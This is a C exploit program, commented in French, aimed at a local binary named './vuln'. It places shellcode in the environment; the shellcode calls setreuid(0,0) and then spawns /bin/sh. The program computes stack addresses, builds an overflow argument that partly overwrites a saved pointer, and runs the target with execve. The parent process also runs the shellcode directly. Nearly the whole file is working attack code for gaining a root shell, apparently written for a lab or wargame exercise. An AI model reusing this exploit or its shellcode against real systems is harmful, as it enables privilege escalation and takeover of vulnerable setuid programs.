#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define STACK (0xc0000000 - 4)
#define VUL "./vuln"
#define ARGINIT "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXYYttttttttbbbb"

char *shellcode =
"\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x6a\x0b\x58"
"\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x52\x53\x89\xe1\xcd\x80";

int main() {
	pid_t pid = fork();

	if(pid == 0) { // fils
	
		char *env;
		char buf[6 + 1];
		char *envp[] = {NULL, NULL};
		char *execve_argv[] = {VUL, NULL, NULL};
		int buf_addr, ret, ret_addr;
		char b0, b1;
	
		env = malloc(128);
	
		/* Calcul de l'adresse du shellcode dans l'environnement */
		ret = STACK - sizeof(VUL) - strlen(shellcode) - 1;
		
		/* On calcule à quelle adresse dans l'environnement se trouve notre fausse adresse de retour */
		ret_addr = STACK - sizeof(VUL) - strlen(shellcode) - 1 - 4;
	
			/* On place dans l'environnement notre adresse de retour et notre shellcode */
		*(int *)env = ret;
		strcat(env, shellcode);
		envp[0] = env;
	
		/* On extrait les deux derniers octets de l'adresse dans l'environnement où se trouve notre adresse de retour */
		b0 = (ret_addr >> 8) & 0xff;
		b1 = (ret_addr     ) & 0xff;
		/* On crée notre buffer octets par octets */
		buf[0] = 0xc4;
		buf[1] = 0x83;
		buf[2] = 0x04;
		buf[3] = 0x08;
		buf[4] = b1 - 4; /* %eip_sauvé = %eip_sauvé + 4 */
		buf[5] = b0;
		buf[6] = 0x0;
		
		char *final = malloc(sizeof(char)*1000);
		strcpy (final, ARGINIT);
		
		strcat(final, buf);
		
		execve_argv[1] = final;
		execve(execve_argv[0], execve_argv, envp);
		
	} else if(pid > 0) { // père
		
		/* exécution du shellcode */
		printf("exécution du shellcode...\n");
		int(*f)()=(int(*)())shellcode;f();
	}
}

